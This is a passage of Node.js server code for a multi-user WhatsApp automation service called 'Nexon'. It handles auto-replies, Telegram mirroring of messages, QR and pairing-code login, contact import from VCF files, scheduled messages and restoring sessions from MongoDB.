                    : `📥 <b>INCOMING (From: ${contactName} | <code>${formattedNumber}</code>):</b>`;

                if (mediaData) {
                    if (mediaData.isTooLarge) {
                        const skipMsg = `🛡️ [Nexon Automation]\n${directionTag}\n[Media Skipped - Size > 50MB]`;
                        pushToTgQueue(userId, { type: 'text', text: skipMsg });
                    } else {
                        pushToTgQueue(userId, { 
                            type: 'media', 
                            mediaType: mediaData.mediaType, 
                            buffer: mediaData.buffer, 
                            filename: mediaData.filename, 
                            caption: `🛡️ [Nexon Automation]\n${directionTag}\n${mediaData.caption || ''}` 
                        });
                    }
                } else if (messageText) {
                    pushToTgQueue(userId, { type: 'text', text: `🛡️ [Nexon Automation]\n${directionTag}\n💬 ${messageText}` });
                }

                if (isFromMe) continue;

                if (!messageText && !mediaData) continue;
                if (!session.isEnabled) continue;
                if (!finalLast10) continue;

                let isSavedInVcfDb = false;
                for (let [dbId, contact] of session.contactsMap.entries()) {
                    if (getLast10Digits(contact.id || dbId) === finalLast10) { isSavedInVcfDb = true; break; }
                }

                if (isSavedInVcfDb) {
                    let matchedBatch = null;
                    for (let batch of session.batchesConfig) {
                        if (batch.contacts && batch.contacts.some(cId => getLast10Digits(cId) === finalLast10)) { matchedBatch = batch; break; }
                    }
                    if (matchedBatch) {
                        const lastTime = session.cooldownMap.get(finalLast10) || 0;
                        if (Date.now() - lastTime >= 15 * 60 * 1000) {
                            session.cooldownMap.set(finalLast10, Date.now());
                            await session.sock.sendMessage(targetJid, { text: matchedBatch.message });
                            await logUserHistory(userId, 'batch', targetJid, matchedBatch.message);
                        }
                    }
                    continue;
                }

                const lastTime = session.cooldownMap.get(finalLast10) || 0;
                if (Date.now() - lastTime < 15 * 60 * 1000) continue;
                session.cooldownMap.set(finalLast10, Date.now());
                await session.sock.sendMessage(targetJid, { text: session.fallbackMessage });
                await logUserHistory(userId, 'fallback', targetJid, session.fallbackMessage);

            } catch (innerErr) {
                console.error('[MESSAGE UPSERT ERROR CAUGHT]:', innerErr.message);
            }
        }
    });
}

// Global Safety Catchers
process.on('uncaughtException', (err) => { console.error('[CRITICAL UNCAUGHT EXCEPTION]:', err.message); });
process.on('unhandledRejection', (reason) => { console.error('[CRITICAL UNHANDLED REJECTION]:', reason); });

// --- API Endpoints ---
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/api/user-profile', async (req, res) => {
    const userId = getCleanUserId(req);
    const { email } = req.body;
    if (!email) return res.status(400).json({ status: 'Email required' });
    const session = getUserSessionState(userId);
    session.userEmail = email.trim();
    await persistTelegramConfig(userId);
    res.json({ status: 'User profile synchronized successfully!' });
});

app.post('/api/history/delete-batch', async (req, res) => {
    try {
        const userId = getCleanUserId(req);
        const session = getUserSessionState(userId);
        const { ids, clearAll } = req.body;

        if (!session.messageHistory) session.messageHistory = [];

        if (clearAll === true) {
            session.messageHistory = [];
        } else if (ids && Array.isArray(ids)) {
            session.messageHistory = session.messageHistory.filter(item => !ids.includes(item.id));
        } else {
            return res.status(400).json({ status: 'Invalid deletion parameters.' });
        }

        await persistHistory(userId);
        res.json({ status: 'Logs deleted successfully!' });
    } catch (err) {
        res.status(500).json({ status: 'Failed to delete logs: ' + err.message });
    }
});

app.post('/api/reset-session', async (req, res) => {
    const userId = getCleanUserId(req);
    const session = getUserSessionState(userId);
    try {
        if (session.sock) { try { await session.sock.logout(); } catch (e) { session.sock.end(); } }
        
        const { sessionsCollection: col } = await ensureMongo();
        if (col) {
            await col.deleteOne({ userId });
        }

        session.cooldownMap.clear();
        session.status = 'disconnected';
        session.latestQR = "";
        setTimeout(() => { startUserBot(userId); }, 1000);

        res.json({ status: 'Session disconnected and reset successfully! You can now reconnect.' });
    } catch (err) {
        res.status(500).json({ status: 'Failed to reset session: ' + err.message });
    }
});

app.post('/api/request-pairing-code', async (req, res) => {
    const userId = getCleanUserId(req);
    let { phoneNumber } = req.body;

    if (!phoneNumber) {
        return res.status(400).json({ status: 'Phone number is required' });
    }

    phoneNumber = phoneNumber.toString().replace(/[^0-9]/g, '');

    try {
        const session = getUserSessionState(userId);
        
        if (session.sock) {
            try { await session.sock.logout(); } catch (e) { session.sock.end(); }
            session.sock = null;
        }

        const { sessionsCollection: col } = await ensureMongo();
        if (col) {
            await col.deleteOne({ userId });
        }

        await startUserBot(userId);

        let retries = 25;
        while ((!session.sock || !session.sock.ws || session.sock.ws.readyState !== 1) && retries > 0) {
            await new Promise(r => setTimeout(r, 400));
            retries--;
        }

        if (!session.sock) {
            return res.status(500).json({ status: 'WhatsApp socket initialization failed.' });
        }

        await new Promise(r => setTimeout(r, 1500));

        if (typeof session.sock.requestPairingCode !== 'function') {
            return res.status(500).json({ status: 'Pairing code method not supported on current socket.' });
        }

        let code = await session.sock.requestPairingCode(phoneNumber);
        
        if (code && code.length === 8) {
            code = code.match(/.{1,4}/g).join('-');
        }

        res.json({ status: 'success', pairingCode: code });
    } catch (err) {
        console.error('[PAIRING CODE ERROR]:', err.message);
        res.status(500).json({ status: 'Connection Closed / Failed to generate code. Please retry.' });
    }
});

app.get('/qr', async (req, res) => {
    const userId = getCleanUserId(req);
    const session = getUserSessionState(userId);

    if (!session.sock && session.status === 'disconnected') {
        startUserBot(userId);
    }

    if (!session.latestQR) {
        return res.send(`
            <div style="text-align:center; margin-top:50px; background:#090d16; color:#34d399; font-family:monospace; padding:40px; min-height:100vh;">
                <h2>✅ WhatsApp is already connected or QR code is generating!</h2>
                <p style="color:#94a3b8; margin-top:15px;">Please wait a few seconds and refresh.</p>
                <br><a href="/dashboard.html?userId=${userId}" style="color:#38bdf8;">&larr; Back to Dashboard</a>
            </div>
        `);
    }
    try {
        const dataUrl = await QRCodeLib.toDataURL(session.latestQR);
        res.send(`
            <div style="text-align:center; margin-top:40px; background:#090d16; color:#f1f5f9; font-family:monospace; padding:30px; min-height:100vh;">
                <h2 style="color:#38bdf8; text-shadow: 0 0 10px rgba(56,189,248,0.5);">NEXON - Scan WhatsApp QR Code</h2>
                <p style="color:#94a3b8; margin:15px 0 25px 0;">Open WhatsApp &rarr; Linked Devices &rarr; Link a Device</p>
                <div style="display:inline-block; padding:15px; background:#fff; border-radius:12px; box-shadow: 0 0 30px rgba(56,189,248,0.5);">
                    <img src="${dataUrl}" alt="WhatsApp QR Code" style="width:320px; height:320px; display:block;" />
                </div>
                <p style="color:#34d399; margin-top:20px; font-size:0.85rem;">Page auto-refreshes every 10 seconds...</p>
                <br><a href="/dashboard.html?userId=${userId}" style="color:#38bdf8;">&larr; Back to Dashboard</a>
                <script>setTimeout(() => window.location.reload(), 10000);</script>
            </div>
        `);
    } catch (err) {
        res.status(500).send('Error generating graphical QR code');
    }
});

app.get('/api/status', async (req, res) => {
    const userId = getCleanUserId(req);
    const session = getUserSessionState(userId);
    await loadUserConfigFromMongo(userId);
    if (session.contactsMap.size === 0) await loadUserContactsFromMongo(userId);
    if (session.batchesConfig.length === 0) await loadUserBatchesFromMongo(userId);
    if (session.scheduledMessages.length === 0) await loadUserSchedulesFromMongo(userId);
    res.json({
        enabled: session.isEnabled,
        status: session.status,
        totalContacts: session.contactsMap.size,
        activeBatches: session.batchesConfig.length,
        scheduledCount: session.scheduledMessages.length
    });
});

app.get('/api/telegram-settings', async (req, res) => {
    const userId = getCleanUserId(req);
    const session = getUserSessionState(userId);
    if (!session.tgConfig?.chatId) {
        await loadUserTelegramConfigFromMongo(userId);
    }
    res.json(session.tgConfig);
});

app.post('/api/telegram-settings', async (req, res) => {
    const userId = getCleanUserId(req);
    const session = getUserSessionState(userId);
    const { chatId } = req.body;
    if (chatId !== undefined) session.tgConfig.chatId = chatId.trim();
    await persistTelegramConfig(userId);
    res.json({ status: 'Telegram Chat ID saved successfully! Backup is active.', tgConfig: session.tgConfig });
});

app.get('/api/config', async (req, res) => {
    const userId = getCleanUserId(req);
    const session = getUserSessionState(userId);
    await loadUserConfigFromMongo(userId);
    res.json({
        enabled: session.isEnabled,
        fallbackMessage: session.fallbackMessage
    });
});

app.post('/api/config', async (req, res) => {
    const userId = getCleanUserId(req);
    const session = getUserSessionState(userId);
    try {
        const { enabled, fallbackMessage } = req.body;
        if (typeof enabled === 'boolean') session.isEnabled = enabled;
        if (fallbackMessage !== undefined) session.fallbackMessage = fallbackMessage;

        await persistUserConfig(userId);

        res.json({ status: `Configuration updated successfully!`, fallbackMessage: session.fallbackMessage });
    } catch (err) {
        res.status(500).json({ status: 'Failed to update config: ' + err.message });
    }
});

app.get('/api/history', async (req, res) => {
    const userId = getCleanUserId(req);
    const session = getUserSessionState(userId);
    if (!session.messageHistory || session.messageHistory.length === 0) {
        await loadUserHistoryFromMongo(userId);
    }
    res.json(session.messageHistory || []);
});

app.get('/api/contacts', async (req, res) => {
    const userId = getCleanUserId(req);
    const session = getUserSessionState(userId);
    if (session.contactsMap.size === 0) {
        await loadUserContactsFromMongo(userId);
    }
    res.json(Array.from(session.contactsMap.values()));
});

app.post('/api/contacts/update', async (req, res) => {
    const userId = getCleanUserId(req);
    const { id, name } = req.body;
    const session = getUserSessionState(userId);
    try {
        if (session.contactsMap.has(id)) {
            const contact = session.contactsMap.get(id);
            contact.name = name;
            session.contactsMap.set(id, contact);
            await persistContacts(userId);
            res.json({ status: 'Contact updated successfully!' });
        } else { throw new Error('Contact not found.'); }
    } catch (err) {
        res.status(500).json({ status: 'Failed to update contact: ' + err.message });
    }
});

app.delete('/api/contacts/:id', async (req, res) => {
    const userId = getCleanUserId(req);
    const id = decodeURIComponent(req.params.id);
    const session = getUserSessionState(userId);
    try {
        if (session.contactsMap.has(id)) {
            session.contactsMap.delete(id);
            await persistContacts(userId);
            res.json({ status: 'Contact deleted successfully!' });
        } else { throw new Error('Contact not found.'); }
    } catch (err) {
        res.status(500).json({ status: 'Failed to delete contact: ' + err.message });
    }
});

app.get('/api/batches', async (req, res) => {
    const userId = getCleanUserId(req);
    const session = getUserSessionState(userId);
    if (!session.batchesConfig || session.batchesConfig.length === 0) {
        await loadUserBatchesFromMongo(userId);
    }
    res.json(session.batchesConfig || []);
});

app.post('/api/batches', async (req, res) => {
    const userId = getCleanUserId(req);
    const { batches } = req.body;
    const session = getUserSessionState(userId);
    try {
        if (batches && Array.isArray(batches)) {
            session.batchesConfig = batches;
            await persistBatches(userId);
            res.json({ status: 'Batches updated successfully!' });
        } else { throw new Error('Invalid batch format.'); }
    } catch (err) {
        res.status(500).json({ status: 'Failed to save batches: ' + err.message });
    }
});

app.get('/api/schedule', async (req, res) => {
    const userId = getCleanUserId(req);
    const session = getUserSessionState(userId);
    if (session.scheduledMessages.length === 0) {
        await loadUserSchedulesFromMongo(userId);
    }
    res.json(session.scheduledMessages || []);
});

app.post('/api/schedule', upload.array('mediaFiles', 10), async (req, res) => {
    try {
        const userId = getCleanUserId(req);
        const session = getUserSessionState(userId);
        const { contactIds, directNumber, datetime, dateStr, timeStr, period, message, scheduleType, specialSlots } = req.body;

        let parsedContactIds = [];
        if (contactIds) {
            parsedContactIds = typeof contactIds === 'string' ? JSON.parse(contactIds) : contactIds;
        }
        if (!Array.isArray(parsedContactIds)) parsedContactIds = [];

        if (directNumber && directNumber.toString().trim()) {
            const directFormatted = formatJidAndName(directNumber.toString().trim(), 'Direct Recipient');
            if (!directFormatted) {
                throw new Error('Invalid direct phone number (enter at least 10 digits).');
            }
            if (!parsedContactIds.includes(directFormatted.id)) {
                parsedContactIds.push(directFormatted.id);
            }
        }

        const isSpecialText = scheduleType === 'special_text';
        if (isSpecialText && parsedContactIds.length > 1) {
            parsedContactIds = [parsedContactIds[0]];
        }

        if (isSpecialText && specialSlots) {
            const parsedSlots = typeof specialSlots === 'string' ? JSON.parse(specialSlots) : specialSlots;
            if (!parsedContactIds.length || !dateStr || !Array.isArray(parsedSlots) || parsedSlots.length === 0) {
                throw new Error('Select a recipient, date, and add at least one time & message row.');
            }

            let addedCount = 0;
            for (const slot of parsedSlots) {
                const slotTime = (slot.timeStr || '').trim();
                const slotPeriod = (slot.period || 'AM').trim();
                const slotMessage = (slot.message || '').trim();
                const slotTargetMs = parseIstDateTimeToMs(dateStr, slotTime, slotPeriod);
                if (isNaN(slotTargetMs) || !slotMessage) {
                    throw new Error('Each Special Message row must have a valid 12-hour time and message.');
                }

                session.scheduledMessages.push({
                    id: 'sched_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
                    userId,
                    scheduleType: 'special_text',
                    timezone: 'Asia/Kolkata',
                    contactIds: [parsedContactIds[0]],
                    datetime: new Date(slotTargetMs).toISOString(),
                    targetMs: slotTargetMs,
                    message: slotMessage,
                    mediaPaths: []
                });
                addedCount++;
            }

            await persistSchedules(userId);
            return res.json({ status: `${addedCount} Special Message(s) scheduled in IST (12-hour format with seconds) successfully!` });
        }

        const targetMs = parseIstDateTimeToMs(datetime || dateStr, timeStr, period);
        if (!parsedContactIds.length || isNaN(targetMs) || !message || !message.toString().trim()) {
            throw new Error('Missing required fields (recipient, IST date/time, and message).');
        }

        const mediaPaths = !isSpecialText && req.files ? req.files.map(file => file.path) : [];
        session.scheduledMessages.push({
            id: 'sched_' + Date.now(),
            userId,
            scheduleType: isSpecialText ? 'special_text' : 'standard',
            timezone: 'Asia/Kolkata',
            contactIds: parsedContactIds,
            datetime: new Date(targetMs).toISOString(),
            targetMs,
            message: message.toString(),
            mediaPaths
        });

        await persistSchedules(userId);
        res.json({ status: isSpecialText ? 'Special message scheduled in IST successfully!' : 'Message and multiple files scheduled successfully!' });
    } catch (err) {
        res.status(500).json({ status: 'Failed to schedule message: ' + err.message });
    }
});

app.delete('/api/schedule/:id', async (req, res) => {
    const userId = getCleanUserId(req);
    const session = getUserSessionState(userId);
    const id = req.params.id;
    try {
        const targetSched = (session.scheduledMessages || []).find(s => s.id === id);
        if (targetSched && targetSched.mediaPaths) {
            cleanupScheduledMediaFiles(targetSched.mediaPaths);
        }
        if (session.armedScheduleIds) session.armedScheduleIds.delete(id);
        session.scheduledMessages = (session.scheduledMessages || []).filter(s => s.id !== id);
        await persistSchedules(userId);
        res.json({ status: 'Scheduled message cancelled!' });
    } catch (err) {
        res.status(500).json({ status: 'Failed to cancel schedule: ' + err.message });
    }
});

app.post('/api/upload-vcf', async (req, res) => {
    const userId = getCleanUserId(req);
    const session = getUserSessionState(userId);
    try {
        const { vcfData } = req.body;
        if (!vcfData) throw new Error('VCF data missing.');
        const cards = vcfData.split(/BEGIN:VCARD/i);
        let parsedCount = 0;

        for (let card of cards) {
            if (!card.includes('END:VCARD')) continue;
            const lines = card.split(/\r\n|\n/);
            let currentName = "";
            let phoneNumbers = [];
            for (let line of lines) {
                line = line.trim();
                if (line.startsWith('FN:')) currentName = line.substring(3).trim();
                else if (line.startsWith('TEL')) {
                    const telMatch = line.match(/:([\+\d\s\-\(\)]+)/);
                    if (telMatch && telMatch[1]) phoneNumbers.push(telMatch[1]);
                }
            }
            if (!currentName) currentName = "Unknown Contact";
            for (let phone of phoneNumbers) {
                const contactObj = formatJidAndName(phone, currentName);
                if (contactObj) {
                    session.contactsMap.set(contactObj.id, { id: contactObj.id, name: currentName });
                    parsedCount++;
                }
            }
        }

        await persistContacts(userId);
        res.json({
            status: `Successfully saved ${parsedCount} contacts (${session.contactsMap.size} total in account) to database!`,
            totalContacts: session.contactsMap.size
        });
    } catch (err) {
        res.status(500).json({ status: 'Failed to process VCF file: ' + err.message });
    }
});

// --- AUTO-RESTORE SESSIONS, CONFIG, CONTACTS, BATCHES, HISTORY, SCHEDULES & TG CONFIG FROM MONGODB ---
async function autoRestoreSessions() {
    try {
        const {
            sessionsCollection: sCol,
            contactsCollection: cCol,
            batchesCollection: bCol,
            historyCollection: hCol,
            schedulesCollection: schCol,
            telegramConfigCollection: tgCol,
            userConfigCollection: cfgCol
        } = await ensureMongo();

        if (!sCol || !cCol || !bCol || !hCol || !schCol || !tgCol || !cfgCol) {
            setTimeout(autoRestoreSessions, 2000);
            return;
        }

        const userIdsSet = new Set();
        const [cDocs, bDocs, hDocs, schDocs, tgDocs, cfgDocs, sDocs] = await Promise.all([
            cCol.find({}).toArray(),
            bCol.find({}).toArray(),
            hCol.find({}).toArray(),
            schCol.find({}).toArray(),
            tgCol.find({}).toArray(),
            cfgCol.find({}).toArray(),
            sCol.find({}).toArray()
        ]);

        [cDocs, bDocs, hDocs, schDocs, tgDocs, cfgDocs, sDocs].forEach(arr => {
            arr.forEach(doc => { if (doc && doc.userId) userIdsSet.add(doc.userId); });
        });

        for (const uid of userIdsSet) {
            getUserSessionState(uid);
            await Promise.all([
                loadUserConfigFromMongo(uid),
                loadUserTelegramConfigFromMongo(uid),
                loadUserContactsFromMongo(uid),
                loadUserBatchesFromMongo(uid),
                loadUserHistoryFromMongo(uid),
                loadUserSchedulesFromMongo(uid)
            ]);
            armUpcomingSpecialTimersForUser(uid);
        }

        if (sDocs.length > 0) {
            for (const doc of sDocs) {
                const userId = doc.userId;
                console.log(`🔄 [Auto-Restore] Restoring WhatsApp session from MongoDB for user: ${userId}`);
                getUserSessionState(userId);
                startUserBot(userId);
            }
        }
    } catch (err) {
        console.error('[Auto-Restore MongoDB Error]:', err.message);
    }
}

// Run server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
    console.log(`🚀 Nexon Multi-User Automation Grid running on port ${PORT}`);
    setTimeout(autoRestoreSessions, 2000);
});